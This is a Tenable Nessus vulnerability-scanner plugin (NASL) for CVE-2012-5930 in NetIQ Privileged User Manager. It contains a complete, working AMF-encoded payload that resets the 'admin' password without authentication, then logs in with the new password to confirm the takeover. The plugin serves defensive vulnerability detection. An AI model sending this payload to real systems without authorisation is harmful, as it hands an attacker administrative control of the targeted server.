#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62991);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/12/23 21:38:31 $");

  script_cve_id("CVE-2012-5930");
  script_bugtraq_id(56535);
  script_osvdb_id(87335);
  script_xref(name:"EDB-ID", value:"22737");

  script_name(english:"NetIQ Privileged User Manager Password Change Authentication Bypass (intrusive check)");
  script_summary(english:"Tries to change password for 'admin' user");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is running a web application affected by an
authentication bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to change the password for the 'admin' user of the
NetIQ Privileged User Manager web application without authenticating,
via a specially crafted POST request."
  );
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/9sg_novell_netiq_i_adv.htm");
  script_set_attribute(attribute:"see_also", value:"https://www.novell.com/support/kb/doc.php?id=7011385");
  script_set_attribute(attribute:"solution", value:"Apply NetIQ Privileged User Manager 2.3.1 HF2 (2.3.1-2) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Novell NetIQ 2.3.1 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"patch_publication_date",value:"2012/11/20");
  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:netiq:privileged_user_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("netiq_pum_detect.nasl", "netiq_pum_default_password.nasl"); # check for default password before changing it
  script_require_ports("Services/www", 80, 443);
  script_exclude_keys("Settings/disable_cgi_scanning", "global_settings/supplied_logins_only");
  script_require_keys("www/netiq_pum");

  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# app runs on port 443 by default, but can be configured to run on port 80
port = get_http_port(default:80);

appname = "NetIQ Privileged User Manager";
kb_appname = "netiq_pum";

install = get_install_from_kb(appname:kb_appname, port:port, exit_on_fail:TRUE);
dir = install['dir'];

# the API doesn't enforce any password policy constraints
new_password = rand_str(length:16, charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"); 

# Password change request
# AMF encoded data
postdata =
  raw_string(0x00,0x00,0x00,0x00,0x00,0x01,
             0x00,0x13) + # len 
  "SPF.Util.callMaster" + 
  raw_string(0x00,0x04,0x2f,0x32,0x36,0x32,0x00,0x00,0x02,0x98,0x0a,0x00,0x00,0x00,0x01,
             0x03, # obj
             0x00,0x06) + # len
  "method" +
  raw_string(0x02, # str
             0x00,0x0e) + # len
  "modifyAccounts" +
  raw_string(0x00,0x06) + # len
  "module" + 
  raw_string(0x02, # str
             0x00,0x04) + # len
  "auth" + 
  raw_string(0x00,0x04) + # len
  "User" + 
  raw_string(0x03, # obj
             0x00,0x04) + # len

  "name" +
  raw_string(0x02, # str
             0x00,0x05) + # len
  "admin" +
  raw_string(0x00,0x09) + # len
  "ACT_SUPER" +
  raw_string(0x03, # obj
             0x00,0x05) + # len
  "value" +
  raw_string(0x00,0x3f,0xf0,0x00,0x00,0x00,0x00,0x00,0x00,
             0x00,0x06) + # len
  "action" +
  raw_string(0x02, # str
             0x00,0x03) + # len
  "set" + 
  raw_string(0x00,0x00,0x09, # end obj
             0x00,0x0b) + # len
  "ACT_COMMENT" +     
  raw_string(0x03, # obj
             0x00,0x05) + # len
  "value" + 
  raw_string(0x02, # str
             0x00,0x04) + # len
  "asdd" +
  raw_string(0x00,0x06) + # len
  "action" +  
  raw_string(0x02, # str
             0x00,0x03) + # len
  "set" + 
  raw_string(0x00,0x00,0x09, # end obj
             0x00,0x0a) + # len
  "ACT_PASSWD" + 
  raw_string(0x03, # obj
             0x00,0x05) + # len
  "value" + 
  raw_string(0x02) + # str
  mkword(strlen(new_password)) +
  new_password +
  raw_string(0x00,0x06) + # len
  "action" +  
  raw_string(0x02, # str
             0x00,0x03) + # len
  "set" + 
  raw_string(0x00,0x00,0x09, # end obj
             0x00,0x08) + # len
  "ACT_DESC" +
  raw_string(0x03, # obj
             0x00,0x05) + # len
  "value" +
  raw_string(0x02, # str
             0x00,0x03) + # len
  "sds" +     
  raw_string(0x00,0x06) + # len
  "action" +
  raw_string(0x02, # str
             0x00,0x03) + # len
  "set" + 
  raw_string(0x00,0x00,0x09, # end obj
             0x00,0x00,0x09, # end obj
             0x00,0x03) + # len
  "uid" + 
  raw_string(0x06,
             0x00,0x00,0x09); # end obj

res = http_send_recv3(
  method:'POST',
  item: dir + '/',
  port:port,
  add_headers:make_array(
    'Content-Type', 'application/x-amf', # required
    'x-flash-version', '11,4,402,278'
  ),
  data:postdata, 
  exit_on_fail:TRUE
);

# login to see if password change successful
# AMF encoded data
postdata=
  raw_string(0x00,0x00,0x00,0x00,0x00,0x01,
             0x00,0x15) + # len
  "SPF.Util.callModuleEx" + 
  raw_string(0x00,0x02,0x2f,0x34,0x00,0x00,0x00,0x65,0x0a,0x00,0x00,0x00,0x01,
             0x03, # obj
             0x00,0x03) + # len
  "pkt" +
  raw_string(0x03, # obj
             0x00,0x0b) + # len
  "Credentials" +
  raw_string(0x03, # obj
             0x00, 0x04) + # len
  "name" + 
  raw_string(0x02, # str 
             0x00,0x05) + # len
  "admin" + 
  raw_string(0x00,0x06) + # len
  "passwd" +
  raw_string(0x02) + # str
  mkword(strlen(new_password)) +
  new_password +
  raw_string(0x00,0x00,0x09, # end obj
             0x00,0x06) + # len
  "method" +  
  raw_string(0x02, # str
             0x00,0x05) + # len
  "login" +
  raw_string(0x00,0x06) + # len
  "module" +
  raw_string(0x02, # str
             0x00,0x04) + # len
  "auth" +
  raw_string(0x00,0x03) + # len
  "uid" +
  raw_string(0x06,
             0x00,0x00,0x09, # end obj
             0x00,0x00,0x09); # end obj

res = http_send_recv3(
  method:'POST',
  item: dir + '/',
  port:port,
  add_headers:make_array(
    'Content-Type', 'application/x-amf', # required
    'x-flash-version', '11,4,402,278'
  ),
  data:postdata, 
  exit_on_fail:TRUE
);

# try to parse out login message
msg = NULL;
msg_search = raw_string(
               0x00, 0x07, # length
               0x6d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, # "message"
               0x02 # string is next
             );

pos = stridx(res[2], msg_search);
if (msg_search >< res[2] && pos >= 0)
{
  len = getword(blob:res[2], pos:pos+strlen(msg_search));
  if (len == NULL) exit(1, "The response from port "+port+" is not long enough to contain the length of the message string.");

  if (strlen(res[2]) <  pos + strlen(msg_search) + 2 + len) exit(1, "The response from port "+port+" is not long enough to contain the message string.");

  msg = substr(res[2], pos + strlen(msg_search) + 2, pos + strlen(msg_search) + 2 + len - 1);  
}

if (
  !isnull(msg) &&
  (
    'successfully authenticated' >< msg ||
    'Password has expired' >< msg
  ) &&
  'Invalid user name or password' >!< msg
)
{
  if (report_verbosity > 0)
  {
    report = '\nNessus was able to change the login credentials for the \'admin\' user : \n\n' +
    '  New Password : ' + new_password + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(qs:dir, port:port));
